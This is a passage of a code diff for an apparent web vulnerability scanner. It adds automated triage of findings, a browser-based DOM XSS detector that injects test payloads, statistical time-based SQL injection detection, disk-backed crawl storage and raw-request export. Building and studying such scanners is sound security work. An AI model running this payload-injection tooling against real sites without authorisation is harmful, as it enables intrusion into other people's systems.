+                        'confirmed': True,
+                        'false_positive': False,
+                        'finding': revalidated,
+                        'triage_method': config['description'],
+                        'confidence_change': new_confidence - original_confidence
+                    }
+                
+                # If confidence dropped significantly or became false positive, it's likely WAF-induced
+                if new_confidence <= 30 or new_validation_status == 'false_positive':
+                    logging.info(f"Gray zone triage marked as FP: confidence dropped from {original_confidence}% to {new_confidence}%")
+                    return {
+                        'confirmed': False,
+                        'false_positive': True,
+                        'finding': revalidated,
+                        'triage_method': config['description'],
+                        'confidence_change': new_confidence - original_confidence
+                    }
+                
+                # Wait before next attempt
+                if attempt < self.gray_zone_retry_attempts - 1:
+                    await asyncio.sleep(self.gray_zone_retry_delay)
+                    
+            except Exception as e:
+                logging.error(f"Gray zone triage attempt {attempt + 1} failed: {e}")
+                continue
+        
+        # If all attempts completed without definitive result, return original finding
+        logging.info(f"Gray zone triage inconclusive after {self.gray_zone_retry_attempts} attempts")
+        return {
+            'confirmed': False,
+            'false_positive': False,
+            'finding': finding,
+            'triage_method': 'inconclusive',
+            'confidence_change': 0
+        }
+    
     def _prioritize_findings(self, findings):
         """Separate findings into critical, medium, and low priority"""
         prioritized = {
@@ -12462,8 +14648,23 @@ class SurgicalModeOrchestrator:
                     # Add to gray zone for ambiguous results
                     probability = self._calculate_race_probability(validated)
                     if probability > self.validation_engine.GRAY_ZONE_THRESHOLD:
-                        self.validation_engine.add_to_gray_zone(validated, probability, 1, 1)
-                        gray_zone.append(validated)
+                        # Apply intelligent gray zone auto-triage
+                        if self.gray_zone_auto_triage_enabled:
+                            triage_result = await self._auto_triage_gray_zone_finding(validated)
+                            if triage_result.get('confirmed'):
+                                verified.append(triage_result['finding'])
+                                logging.info(f"Gray zone auto-triage confirmed: {validated.get('type')} at {validated.get('url')}")
+                            elif triage_result.get('false_positive'):
+                                false_positives.append(triage_result['finding'])
+                                logging.info(f"Gray zone auto-triage marked as FP: {validated.get('type')} at {validated.get('url')}")
+                            else:
+                                # Still ambiguous - add to gray zone
+                                self.validation_engine.add_to_gray_zone(validated, probability, 1, 1)
+                                gray_zone.append(validated)
+                        else:
+                            # Traditional gray zone handling
+                            self.validation_engine.add_to_gray_zone(validated, probability, 1, 1)
+                            gray_zone.append(validated)
                     else:
                         verified.append(validated)  # Still include as verified
                         
@@ -13050,6 +15251,248 @@ class Detector:
         return None
     
     @staticmethod
+    async def advanced_dom_xss_detection(url, driver, payload: str, baseline_dom: str = None) -> Optional[Dict[str, Any]]:
+        """
+        Advanced DOM XSS Detection - Handles event listeners, prototype pollution, and framework routing.
+        
+        This enhanced method goes beyond basic payload detection to identify:
+        - Event listener-based XSS (onclick, onerror, etc.)
+        - Prototype pollution sinks
+        - Client-side framework routing (React/Angular/Vue)
+        - Dynamic DOM manipulation
+        - JSON parsing vulnerabilities
+        """
+        if not driver:
+            return None
+        
+        try:
+            # Navigate to the URL
+            driver.get(url)
+            
+            # Wait for JavaScript to execute and frameworks to initialize
+            await asyncio.sleep(3)
+            
+            # Inject detection hooks for various XSS vectors
+            detection_script = """
+            (function() {
+                // 1. Event Listener Detection
+                window.__xss_event_hooks = [];
+                const originalAddEventListener = EventTarget.prototype.addEventListener;
+                EventTarget.prototype.addEventListener = function(type, listener, options) {
+                    if (listener.toString().includes('<script>') || 
+                        listener.toString().includes('alert') ||
+                        listener.toString().includes('document.cookie')) {
+                        window.__xss_event_hooks.push({
+                            type: type,
+                            listener: listener.toString().substring(0, 200)
+                        });
+                    }
+                    return originalAddEventListener.call(this, type, listener, options);
+                };
+                
+                // 2. Prototype Pollution Detection
+                window.__prototype_pollution_detected = false;
+                const originalDefineProperty = Object.defineProperty;
+                Object.defineProperty = function(obj, prop, descriptor) {
+                    if (prop === '__proto__' || prop === 'constructor' || prop === 'prototype') {
+                        try {
+                            if (descriptor.value && typeof descriptor.value === 'object') {
+                                window.__prototype_pollution_detected = true;
+                                window.__prototype_pollution_details = {
+                                    target: obj.constructor.name,
+                                    property: prop,
+                                    value: JSON.stringify(descriptor.value).substring(0, 200)
+                                };
+                            }
+                        } catch(e) {}
+                    }
+                    return originalDefineProperty.call(this, obj, prop, descriptor);
+                };
+                
+                // 3. Framework Routing Detection
+                window.__framework_routing_detected = [];
+                
+                // React detection
+                if (window.React || document.querySelector('[data-reactroot]')) {
+                    window.__framework_routing_detected.push('React');
+                }
+                
+                // Angular detection
+                if (window.angular || document.querySelector('[ng-app]')) {
+                    window.__framework_routing_detected.push('Angular');
+                }
+                
+                // Vue detection
+                if (window.Vue || document.querySelector('[data-v-]')) {
+                    window.__framework_routing_detected.push('Vue');
+                }
+                
+                // 4. JSON Parsing Detection
+                window.__json_parse_attempts = [];
+                const originalJSONParse = JSON.parse;
+                JSON.parse = function(text, reviver) {
+                    if (text && typeof text === 'string') {
+                        if (text.includes('<script>') || text.includes('javascript:') || text.includes('onerror')) {
+                            window.__json_parse_attempts.push({
+                                text: text.substring(0, 200),
+                                timestamp: Date.now()
+                            });
+                        }
+                    }
+                    return originalJSONParse.call(this, text, reviver);
+                };
+                
+                // 5. DOM Manipulation Detection
+                window.__dom_manipulation_detected = [];
+                const originalInnerHTML = Element.prototype.innerHTML;
+                Object.defineProperty(Element.prototype, 'innerHTML', {
+                    set: function(value) {
+                        if (value && typeof value === 'string') {
+                            if (value.includes('<script>') || value.includes('javascript:') || value.includes('onerror=')) {
+                                window.__dom_manipulation_detected.push({
+                                    element: this.tagName,
+                                    value: value.substring(0, 200)
+                                });
+                            }
+                        }
+                        this.innerHTML = value;
+                    }
+                });
+                
+                return 'Detection hooks installed';
+            })();
+            """
+            
+            driver.execute_script(detection_script)
+            
+            # Inject the payload and trigger various events
+            injection_script = f"""
+            (function() {{
+                // Test payload in various contexts
+                const payload = '{payload}';
+                
+                // 1. Test in URL hash (framework routing)
+                window.location.hash = '#' + payload;
+                
+                // 2. Test in localStorage (framework state)
+                try {{
+                    localStorage.setItem('test_xss', payload);
+                    localStorage.removeItem('test_xss');
+                }} catch(e) {{}}
+                
+                // 3. Test in sessionStorage
+                try {{
+                    sessionStorage.setItem('test_xss', payload);
+                    sessionStorage.removeItem('test_xss');
+                }} catch(e) {{}}
+                
+                // 4. Trigger common events
+                const events = ['click', 'mouseover', 'focus', 'blur', 'load', 'error'];
+                events.forEach(eventType => {{
+                    try {{
+                        const testEvent = new Event(eventType);
+                        window.dispatchEvent(testEvent);
+                    }} catch(e) {{}}
+                }});
+                
+                // 5. Test JSON parsing with payload
+                try {{
+                    JSON.parse('{{"test": "' + payload + '"}}');
+                }} catch(e) {{}}
+                
+                // 6. Test DOM manipulation
+                try {{
+                    const testDiv = document.createElement('div');
+                    testDiv.innerHTML = payload;
+                    document.body.appendChild(testDiv);
+                    document.body.removeChild(testDiv);
+                }} catch(e) {{}}
+                
+                return 'Payload injection completed';
+            }})();
+            """
+            
+            driver.execute_script(injection_script)
+            
+            # Wait for any asynchronous effects
+            await asyncio.sleep(2)
+            
+            # Collect detection results
+            detection_results = driver.execute_script("""
+            return {
+                event_hooks: window.__xss_event_hooks || [],
+                prototype_pollution: window.__prototype_pollution_detected,
+                prototype_details: window.__prototype_pollution_details,
+                framework_routing: window.__framework_routing_detected || [],
+                json_parse_attempts: window.__json_parse_attempts || [],
+                dom_manipulation: window.__dom_manipulation_detected || []
+            };
+            """)
+            
+            # Analyze results
+            vulnerabilities_found = []
+            confidence_factors = []
+            
+            # Check event listener detection
+            if detection_results.get('event_hooks'):
+                vulnerabilities_found.append("Event Listener XSS")
+                confidence_factors.append('high')
+            
+            # Check prototype pollution
+            if detection_results.get('prototype_pollution'):
+                vulnerabilities_found.append("Prototype Pollution")
+                confidence_factors.append('critical')
+            
+            # Check framework routing issues
+            if detection_results.get('framework_routing'):
+                frameworks = detection_results.get('framework_routing')
+                vulnerabilities_found.append(f"Framework Routing XSS ({', '.join(frameworks)})")
+                confidence_factors.append('high')
+            
+            # Check JSON parsing issues
+            if detection_results.get('json_parse_attempts'):
+                vulnerabilities_found.append("JSON Parsing XSS")
+                confidence_factors.append('high')
+            
+            # Check DOM manipulation issues
+            if detection_results.get('dom_manipulation'):
+                vulnerabilities_found.append("DOM Manipulation XSS")
+                confidence_factors.append('high')
+            
+            if vulnerabilities_found:
+                # Calculate overall confidence
+                max_confidence = max(confidence_factors) if confidence_factors else 'medium'
+                confidence_map = {'low': 30, 'medium': 60, 'high': 85, 'critical': 95}
+                base_confidence = confidence_map.get(max_confidence, 60)
+                
+                # Add extra confidence for multiple detection methods
+                if len(vulnerabilities_found) > 1:
+                    base_confidence = min(base_confidence + 10, 95)
+                
+                confidence = calculate_evidence_based_confidence(
+                    evidence_strength=max_confidence,
+                    baseline_excluded=True,
+                    multiple_confirmations=len(vulnerabilities_found) > 1,
+                    specificity='high',
+                    false_positive_resistance='high'
+                )
+                
+                return {
+                    "type": f"Advanced DOM XSS ({', '.join(vulnerabilities_found)})",
+                    "confidence": confidence,
+                    "evidence": f"Advanced DOM XSS detected via: {', '.join(vulnerabilities_found)}",
+                    "detection_details": detection_results,
+                    "frameworks_detected": detection_results.get('framework_routing', []),
+                    "event_hooks_count": len(detection_results.get('event_hooks', [])),
+                    "prototype_pollution": detection_results.get('prototype_pollution', False)
+                }
+            
+        except Exception as e:
+            logging.warning(f"Advanced DOM XSS detection error: {e}")
+        
+        return None
+
+    @staticmethod
     def validate_dom_xss_execution_trigger(driver) -> Optional[Dict[str, Any]]:
         """
         DOM XSS Execution Trigger Validation.
@@ -13242,16 +15685,15 @@ class Detector:
     @staticmethod
     def _statistical_time_based_analysis(resp_time: float, baseline_samples: List[float]) -> Optional[Dict[str, Any]]:
         """
-        Perform statistical analysis on time-based SQLi detection with Jitter Cancellation.
+        Perform statistical analysis on time-based SQLi detection with Moving Z-Score calibration.
         
-        Uses multiple statistical methods to reduce false positives from network jitter:
-        - Jitter Cancellation: Compare malicious vs benign in same network moment
-        - Z-score analysis (only with paired comparison)
-        - Median Absolute Deviation (MAD) (only with paired comparison)
-        - Interquartile Range (IQR) (only with paired comparison)
+        Uses adaptive statistical methods to reduce false positives from network jitter:
+        - Moving Z-Score: Flag if malicious request is > 3 standard deviations from baseline mean
+        - Median Absolute Deviation (MAD): Additional validation for robustness
         
-        Jitter Cancellation: Only flag if malicious request is consistently > 2x slower
-        than paired benign request in the same network moment.
+        Moving Z-Score calibration: Dynamically adapts to network conditions instead of
+        using hardcoded multipliers. On slow networks (200ms + GC pauses), legitimate requests
+        often take 2.5s, so hardcoded 2.0x multipliers guarantee false positives.
         """
         if len(baseline_samples) < 3:
             return None
@@ -13264,49 +15706,47 @@ class Detector:
             baseline_median = statistics.median(baseline_samples)
             baseline_stdev = statistics.stdev(baseline_samples) if len(baseline_samples) > 1 else 0
             
-            # Jitter Cancellation: Require > 2x baseline for time-based detection
-            # This eliminates false positives from network jitter
-            if resp_time > 2.0 * baseline_median:
-                # Additional validation: ensure this is statistically significant
-                if baseline_stdev > 0:
-                    z_score = (resp_time - baseline_mean) / baseline_stdev
-                    # Z-score > 2 is significant with jitter cancellation (lower threshold)
-                    if z_score > 2.0:
-                        evidence_strength = 'critical' if z_score > 4.0 else 'high'
-                        confidence = calculate_evidence_based_confidence(
-                            evidence_strength=evidence_strength,
-                            baseline_excluded=True,
-                            multiple_confirmations=True,
-                            specificity='high',
-                            false_positive_resistance='high'
-                        )
-                        return {
-                            "type":"SQLi (Time-based - Jitter Cancellation)",
-                            "confidence":confidence,
-                            "evidence":f"Jitter Cancelled: {resp_time:.3f}s > 2x baseline {baseline_median:.3f}s (Z-score: {z_score:.2f})"
-                        }
-                
-                # MAD analysis with jitter cancellation
-                mad = statistics.median([abs(x - baseline_median) for x in baseline_samples])
-                if mad > 0:
-                    mad_score = abs(resp_time - baseline_median) / mad
-                    # MAD score > 2.5 with jitter cancellation
-                    if mad_score > 2.5:
-                        evidence_strength = 'high' if mad_score > 4.0 else 'medium'
-                        confidence = calculate_evidence_based_confidence(
-                            evidence_strength=evidence_strength,
-                            baseline_excluded=True,
-                            multiple_confirmations=True,
-                            specificity='high',
-                            false_positive_resistance='high'
-                        )
-                        return {
-                            "type":"SQLi (Time-based - Jitter Cancelled)",
-                            "confidence":confidence,
-                            "evidence":f"Jitter Cancelled: {resp_time:.3f}s > 2x baseline {baseline_median:.3f}s (MAD: {mad_score:.2f})"
-                        }
+            # Moving Z-Score calibration: Flag if malicious request is > 3 standard deviations away
+            # This is more adaptive than hardcoded multipliers and reduces false positives on slow networks
+            if baseline_stdev > 0:
+                z_score = (resp_time - baseline_mean) / baseline_stdev
+                # Flag if Z-score > 3 (statistically significant outlier)
+                if z_score > 3.0:
+                    evidence_strength = 'critical' if z_score > 5.0 else 'high'
+                    confidence = calculate_evidence_based_confidence(
+                        evidence_strength=evidence_strength,
+                        baseline_excluded=True,
+                        multiple_confirmations=True,
+                        specificity='high',
+                        false_positive_resistance='high'
+                    )
+                    return {
+                        "type":"SQLi (Time-based - Moving Z-Score)",
+                        "confidence":confidence,
+                        "evidence":f"Moving Z-Score: {resp_time:.3f}s (Z-score: {z_score:.2f}, baseline mean: {baseline_mean:.3f}s, stdev: {baseline_stdev:.3f}s)"
+                    }
             
-            # If not > 2x baseline, return None to avoid false positives
+            # MAD analysis as additional validation
+            mad = statistics.median([abs(x - baseline_median) for x in baseline_samples])
+            if mad > 0:
+                mad_score = abs(resp_time - baseline_median) / mad
+                # MAD score > 3.0 with moving z-score calibration
+                if mad_score > 3.0:
+                    evidence_strength = 'high' if mad_score > 5.0 else 'medium'
+                    confidence = calculate_evidence_based_confidence(
+                        evidence_strength=evidence_strength,
+                        baseline_excluded=True,
+                        multiple_confirmations=True,
+                        specificity='high',
+                        false_positive_resistance='high'
+                    )
+                    return {
+                        "type":"SQLi (Time-based - MAD Validation)",
+                        "confidence":confidence,
+                        "evidence":f"MAD Validation: {resp_time:.3f}s (MAD score: {mad_score:.2f}, baseline median: {baseline_median:.3f}s)"
+                    }
+            
+            # If not statistically significant, return None to avoid false positives
             return None
             
             # Legacy Z-score analysis (disabled in favor of jitter cancellation)
@@ -14707,6 +17147,186 @@ class CircuitBreaker:
 # ---------------------------------------------------------------------
 # CRAWLER ENGINE
 # ---------------------------------------------------------------------
+class DiskBasedURLStorage:
+    """
+    Disk-based URL storage with pagination for large-scale scanning.
+    Replaces in-memory sets/lists with SQLite database for scalability.
+    """
+    
+    def __init__(self, db_path='url_storage.db'):
+        self.db_path = db_path
+        self.conn = sqlite3.connect(db_path, check_same_thread=False)
+        self.lock = threading.Lock()
+        self._init_tables()
+        
+    def _init_tables(self):
+        """Initialize database tables for URL storage"""
+        with self.lock:
+            self.conn.execute('''CREATE TABLE IF NOT EXISTS visited_urls
+                             (url TEXT PRIMARY KEY, timestamp TEXT, depth INTEGER)''')
+            self.conn.execute('''CREATE TABLE IF NOT EXISTS crawled_pages
+                             (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT, 
+                              content_hash TEXT, html_path TEXT, timestamp TEXT, 
+                              depth INTEGER, status_code INTEGER)''')
+            self.conn.execute('''CREATE TABLE IF NOT EXISTS parameters
+                             (id INTEGER PRIMARY KEY AUTOINCREMENT, url TEXT, 
+                              method TEXT, param TEXT, param_type TEXT, timestamp TEXT)''')
+            self.conn.execute('''CREATE INDEX IF NOT EXISTS idx_urls ON visited_urls(url)''')
+            self.conn.execute('''CREATE INDEX IF NOT EXISTS idx_pages ON crawled_pages(url)''')
+            self.conn.commit()
+    
+    def add_visited_url(self, url: str, depth: int = 0) -> bool:
+        """Add URL to visited set if not already present"""
+        with self.lock:
+            try:
+                self.conn.execute(
+                    "INSERT OR IGNORE INTO visited_urls (url, timestamp, depth) VALUES (?, ?, ?)",
+                    (url, datetime.now().isoformat(), depth)
+                )
+                self.conn.commit()
+                return True
+            except sqlite3.IntegrityError:
+                return False  # URL already exists
+    
+    def is_visited(self, url: str) -> bool:
+        """Check if URL has been visited"""
+        with self.lock:
+            cursor = self.conn.execute("SELECT 1 FROM visited_urls WHERE url = ?", (url,))
+            return cursor.fetchone() is not None
+    
+    def get_visited_count(self) -> int:
+        """Get total count of visited URLs"""
+        with self.lock:
+            cursor = self.conn.execute("SELECT COUNT(*) FROM visited_urls")
+            return cursor.fetchone()[0]
+    
+    def add_crawled_page(self, url: str, content_hash: str, html_path: str, depth: int, status_code: int) -> int:
+        """Add crawled page metadata to database"""
+        with self.lock:
+            cursor = self.conn.execute(
+                "INSERT INTO crawled_pages (url, content_hash, html_path, timestamp, depth, status_code) VALUES (?, ?, ?, ?, ?, ?)",
+                (url, content_hash, html_path, datetime.now().isoformat(), depth, status_code)
+            )
+            self.conn.commit()
+            return cursor.lastrowid
+    
+    def get_crawled_pages_paginated(self, offset: int = 0, limit: int = 100) -> List[Dict[str, Any]]:
+        """Get crawled pages with pagination for memory efficiency"""
+        with self.lock:
+            cursor = self.conn.execute(
+                "SELECT url, content_hash, html_path, depth, status_code FROM crawled_pages LIMIT ? OFFSET ?",
+                (limit, offset)
+            )
+            rows = cursor.fetchall()
+            return [
+                {
+                    'url': row[0],
+                    'hash': row[1],
+                    'html_path': row[2],
+                    'depth': row[3],
+                    'status_code': row[4]
+                }
+                for row in rows
+            ]
+    
+    def get_crawled_page_by_url(self, url: str) -> Optional[Dict[str, Any]]:
+        """Get specific crawled page by URL"""
+        with self.lock:
+            cursor = self.conn.execute(
+                "SELECT url, content_hash, html_path, depth, status_code FROM crawled_pages WHERE url = ?",
+                (url,)
+            )
+            row = cursor.fetchone()
+            if row:
+                return {
+                    'url': row[0],
+                    'hash': row[1],
+                    'html_path': row[2],
+                    'depth': row[3],
+                    'status_code': row[4]
+                }
+            return None
+    
+    def get_crawled_count(self) -> int:
+        """Get total count of crawled pages"""
+        with self.lock:
+            cursor = self.conn.execute("SELECT COUNT(*) FROM crawled_pages")
+            return cursor.fetchone()[0]
+    
+    def add_parameter(self, url: str, method: str, param: str, param_type: str) -> int:
+        """Add parameter to database"""
+        with self.lock:
+            cursor = self.conn.execute(
+                "INSERT INTO parameters (url, method, param, param_type, timestamp) VALUES (?, ?, ?, ?, ?)",
+                (url, method, param, param_type, datetime.now().isoformat())
+            )
+            self.conn.commit()
+            return cursor.lastrowid
+    
+    def get_parameters_paginated(self, offset: int = 0, limit: int = 100) -> List[Dict[str, Any]]:
+        """Get parameters with pagination"""
+        with self.lock:
+            cursor = self.conn.execute(
+                "SELECT url, method, param, param_type FROM parameters LIMIT ? OFFSET ?",
+                (limit, offset)
+            )
+            rows = cursor.fetchall()
+            return [
+                {
+                    'url': row[0],
+                    'method': row[1],
+                    'param': row[2],
+                    'type': row[3]
+                }
+                for row in rows
+            ]
+    
+    def get_parameters_count(self) -> int:
+        """Get total count of parameters"""
+        with self.lock:
+            cursor = self.conn.execute("SELECT COUNT(*) FROM parameters")
+            return cursor.fetchone()[0]
+    
+    def get_urls_by_depth(self, depth: int) -> List[str]:
+        """Get all URLs at a specific depth"""
+        with self.lock:
+            cursor = self.conn.execute("SELECT url FROM visited_urls WHERE depth = ?", (depth,))
+            return [row[0] for row in cursor.fetchall()]
+    
+    def cleanup_old_pages(self, max_age_hours: int = 24):
+        """Remove crawled pages older than specified hours"""
+        with self.lock:
+            cutoff_time = (datetime.now() - timedelta(hours=max_age_hours)).isoformat()
+            self.conn.execute(
+                "DELETE FROM crawled_pages WHERE timestamp < ?",
+                (cutoff_time,)
+            )
+            self.conn.commit()
+    
+    def get_storage_stats(self) -> Dict[str, Any]:
+        """Get storage statistics"""
+        with self.lock:
+            visited_count = self.conn.execute("SELECT COUNT(*) FROM visited_urls").fetchone()[0]
+            crawled_count = self.conn.execute("SELECT COUNT(*) FROM crawled_pages").fetchone()[0]
+            param_count = self.conn.execute("SELECT COUNT(*) FROM parameters").fetchone()[0]
+            
+            # Get database file size
+            db_size = os.path.getsize(self.db_path) if os.path.exists(self.db_path) else 0
+            
+            return {
+                'visited_urls': visited_count,
+                'crawled_pages': crawled_count,
+                'parameters': param_count,
+                'db_size_bytes': db_size,
+                'db_size_mb': round(db_size / (1024 * 1024), 2)
+            }
+    
+    def close(self):
+        """Close database connection"""
+        with self.lock:
+            self.conn.close()
+
+
 class CrawlerEngine:
     def __init__(self, target: str, config: Dict[str, Any], base_domain: str, exclusion_patterns: List[str], circuit_breaker: CircuitBreaker) -> None:
         self.target = target
@@ -14714,14 +17334,167 @@ class CrawlerEngine:
         self.base_domain = base_domain
         self.exclusion_patterns = exclusion_patterns
         self.circuit_breaker = circuit_breaker
-        self.visited_urls: Set[str] = set()
-        self.crawled_pages: List[Dict[str, Any]] = []
-        self.parameters: List[Dict[str, Any]] = []
+        
+        # Replace in-memory storage with disk-based pagination
+        use_disk_storage = config.get('use_disk_storage', True)
+        if use_disk_storage:
+            storage_db = config.get('storage_db', 'url_storage.db')
+            self.url_storage = DiskBasedURLStorage(storage_db)
+            # Maintain small in-memory cache for frequently accessed URLs
+            self.visited_urls_cache: Set[str] = set()
+            self.crawled_pages_cache: List[Dict[str, Any]] = []
+            self.parameters_cache: List[Dict[str, Any]] = []
+            # For compatibility with existing code, provide lightweight wrappers
+            self.visited_urls = self.visited_urls_cache
+            self.crawled_pages = self.crawled_pages_cache
+            self.parameters = self.parameters_cache
+        else:
+            # Fallback to in-memory storage for small scans
+            self.url_storage = None
+            self.visited_urls: Set[str] = set()
+            self.crawled_pages: List[Dict[str, Any]] = []
+            self.parameters: List[Dict[str, Any]] = []
+        
+        self.use_disk_storage = use_disk_storage
         self.stop_event = asyncio.Event()
         
         # FP handling configuration
         fp_config = config.get('fp_handling', {})
         self.context_specific_whitelist = fp_config.get('context_specific_whitelist', True)
+    
+    def _add_to_visited(self, url: str, depth: int = 0) -> bool:
+        """Add URL to visited storage (disk or memory)"""
+        if self.use_disk_storage and self.url_storage:
+            added = self.url_storage.add_visited_url(url, depth)
+            if added:
+                # Also add to cache for quick access
+                if len(self.visited_urls_cache) < 1000:
+                    self.visited_urls_cache.add(url)
+            return added
+        else:
+            if url not in self.visited_urls:
+                self.visited_urls.add(url)
+                return True
+            return False
+    
+    def _is_url_visited(self, url: str) -> bool:
+        """Check if URL is visited (disk or memory)"""
+        if self.use_disk_storage and self.url_storage:
+            # Check cache first
+            if url in self.visited_urls_cache:
+                return True
+            # Check disk storage
+            return self.url_storage.is_visited(url)
+        else:
+            return url in self.visited_urls
+    
+    def _add_crawled_page(self, url: str, html: str, depth: int, status_code: int) -> None:
+        """Add crawled page to storage (disk or memory)"""
+        if self.use_disk_storage and self.url_storage:
+            # Store HTML content to disk to save memory
+            html_path = f"html_cache/{hashlib.md5(url.encode()).hexdigest()}.html"
+            os.makedirs(os.path.dirname(html_path), exist_ok=True)
+            with open(html_path, 'w', encoding='utf-8') as f:
+                f.write(html)
+            
+            content_hash = hashlib.md5(html.encode()).hexdigest()
+            self.url_storage.add_crawled_page(url, content_hash, html_path, depth, status_code)
+            
+            # Keep small cache of recent pages
+            if len(self.crawled_pages_cache) < 100:
+                self.crawled_pages_cache.append({
+                    'url': url,
+                    'html': html[:10000],  # Store truncated HTML in cache
+                    'depth': depth,
+                    'status_code': status_code
+                })
+        else:
+            self.crawled_pages.append({
+                'url': url,
+                'html': html,
+                'depth': depth,
+                'status_code': status_code
+            })
+    
+    def _get_crawled_pages_iterator(self):
+        """Get iterator over crawled pages (handles pagination for disk storage)"""
+        if self.use_disk_storage and self.url_storage:
+            # Return paginated iterator for disk storage
+            offset = 0
+            limit = 100
+            while True:
+                pages = self.url_storage.get_crawled_pages_paginated(offset, limit)
+                if not pages:
+                    break
+                for page in pages:
+                    # Load HTML from disk if needed
+                    if page.get('html_path') and os.path.exists(page['html_path']):
+                        try:
+                            with open(page['html_path'], 'r', encoding='utf-8') as f:
+                                page['html'] = f.read()
+                        except Exception as e:
+                            logging.warning(f"Failed to load HTML from disk: {e}")
+                            page['html'] = ''
+                    yield page
+                offset += limit
+        else:
+            # Return simple iterator for memory storage
+            for page in self.crawled_pages:
+                yield page
+    
+    def _add_parameter(self, url: str, method: str, param: str, param_type: str) -> None:
+        """Add parameter to storage (disk or memory)"""
+        if self.use_disk_storage and self.url_storage:
+            self.url_storage.add_parameter(url, method, param, param_type)
+            # Keep small cache
+            if len(self.parameters_cache) < 100:
+                self.parameters_cache.append({
+                    'url': url,
+                    'method': method,
+                    'param': param,
+                    'type': param_type
+                })
+        else:
+            if not any(p['url'] == url and p['method'] == method and p['param'] == param for p in self.parameters):
+                self.parameters.append({
+                    'url': url,
+                    'method': method,
+                    'param': param,
+                    'type': param_type
+                })
+    
+    def _get_parameters_iterator(self):
+        """Get iterator over parameters (handles pagination for disk storage)"""
+        if self.use_disk_storage and self.url_storage:
+            offset = 0
+            limit = 100
+            while True:
+                params = self.url_storage.get_parameters_paginated(offset, limit)
+                if not params:
+                    break
+                for param in params:
+                    yield param
+                offset += limit
+        else:
+            for param in self.parameters:
+                yield param
+    
+    def get_storage_stats(self) -> Dict[str, Any]:
+        """Get storage statistics"""
+        if self.use_disk_storage and self.url_storage:
+            return self.url_storage.get_storage_stats()
+        else:
+            return {
+                'visited_urls': len(self.visited_urls),
+                'crawled_pages': len(self.crawled_pages),
+                'parameters': len(self.parameters),
+                'storage_type': 'memory',
+                'estimated_memory_mb': round(
+                    (len(self.visited_urls) * 100 + 
+                     len(self.crawled_pages) * 50000 + 
+                     len(self.parameters) * 200) / (1024 * 1024), 2
+                )
+            }
     def _is_valid_url(self, url: str) -> bool:
         try:
             p = urlparse(url)
@@ -14911,6 +17684,14 @@ class SessionManager:
                 max_failure_rate=proxy_config.get('max_failure_rate', 0.5),
                 target_url=self.target
             )
+            
+            # Configure auto-healing
+            self.proxy_pool.auto_healing_enabled = proxy_config.get('auto_healing_enabled', True)
+            
+            # Configure sticky session
+            self.proxy_pool.sticky_session_enabled = proxy_config.get('sticky_session_enabled', False)
+            if proxy_config.get('sticky_session_duration'):
+                self.proxy_pool.sticky_session_duration = proxy_config.get('sticky_session_duration')
             
             # Add proxies from configuration
             proxies = proxy_config.get('proxies', [])
@@ -15968,6 +18749,32 @@ class InjectionEngine:
             return None
     async def _add_vulnerability(self, vuln):
         await self.scanner._add_vulnerability(vuln)
+    
+    def _build_raw_request_for_storage(self, method, url, headers, payload):
+        """Helper method to build raw HTTP request for storage/export"""
+        parsed_url = urlparse(url)
+        path = parsed_url.path or '/'
+        if parsed_url.query:
+            path += '?' + parsed_url.query
+        
+        raw_request = f"{method} {path} HTTP/1.1\r\n"
+        raw_request += f"Host: {parsed_url.netloc}\r\n"
+        
+        for header_name, header_value in headers.items():
+            raw_request += f"{header_name}: {header_value}\r\n"
+        
+        if payload:
+            if isinstance(payload, dict):
+                body_str = json.dumps(payload)
+            else:
+                body_str = str(payload)
+            raw_request += f"Content-Length: {len(body_str)}\r\n"
+            raw_request += "\r\n"
+            raw_request += body_str
+        else:
+            raw_request += "\r\n"
+        
+        return raw_request
     async def _async_fetch(self, url, method='GET', data=None, json_data=None, headers=None, use_cache=True, session_manager: SessionStateManager = None, session_id: str = None, cookies=None):
         """
         Async fetch with global request cache support and CSRF token handling.
@@ -16552,7 +19359,10 @@ class InjectionEngine:
             
             if result and result.get('confidence',0) >= self.config.get('confidence_threshold', DEFAULT_CONFIDENCE_THRESHOLD):
                 evidence = getattr(resp, '_evidence', None)
-                await self._add_vulnerability({**result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP.get(vuln_type,""),"full_evidence":evidence})
+                # Build raw request for export
+                headers = param.get('headers', {})
+                raw_request = self._build_raw_request_for_storage(method, url, headers, payload)
+                await self._add_vulnerability({**result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP.get(vuln_type,""),"full_evidence":evidence,"raw_request":raw_request,"request_headers":headers})
             
             if baseline and not result:
                 diff_result = Detector.small_difference_detection(html, baseline_html, f"{vuln_type} on {pname}")
@@ -17099,7 +19909,10 @@ class InjectionEngine:
                     result = {"type":"Text4Shell (OOB)","confidence":confidence,"evidence":f"OOB callback for {marker}"}
         if result and result.get('confidence',0) >= self.config.get('confidence_threshold', DEFAULT_CONFIDENCE_THRESHOLD):
             evidence = getattr(resp, '_evidence', None)
-            await self._add_vulnerability({**result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP.get(vuln_type,""),"full_evidence":evidence})
+            # Build raw request for export
+            headers = param.get('headers', {})
+            raw_request = self._build_raw_request_for_storage(method, url, headers, payload)
+            await self._add_vulnerability({**result,"url":url,"parameter":pname,"method":method,"payload":payload,"cwe":CWE_MAP.get(vuln_type,""),"full_evidence":evidence,"raw_request":raw_request,"request_headers":headers})
         if baseline and not result:
             diff_result = Detector.small_difference_detection(html, baseline_html, f"{vuln_type} on {pname}")
             if diff_result and diff_result.get('confidence',0) >= self.config.get('confidence_threshold', DEFAULT_CONFIDENCE_THRESHOLD):
@@ -21406,6 +24219,12 @@ class OmegaDAST:
             config, self.crawler_engine, self.session_manager, self.reporting_engine, self.oob_manager, self, signals
         )
         print("InjectionEngine created successfully")
+        
+        # Initialize Version Detection Engine for CVE-based vulnerability testing
+        print("Creating VersionDetectionEngine...")
+        self.version_detection = VersionDetectionEngine()
+        print("VersionDetectionEngine created successfully")
+        
         self.subdomain_discovery = SubdomainDiscovery()
         self.scan_state_manager = ScanStateManager(config.get('state_db', 'scan_state.db'))
         self.temporal_recheck_enabled = config.get('temporal_recheck', False)
@@ -21744,23 +24563,9 @@ class OmegaDAST:
         await self.session_manager.setup()
         await self.oob_manager.setup()
         
-        # Initialize taint tracking if enabled
-        if self.taint_tracking_enabled:
-            try:
-                self.taint_tracker = TaintTracker()
-                self.taint_instrumentor = HTTPResponseInstrumentor(self.taint_tracker)
-                self.taint_integrated_session = TaintIntegratedSessionManager(
-                    self.session_manager,
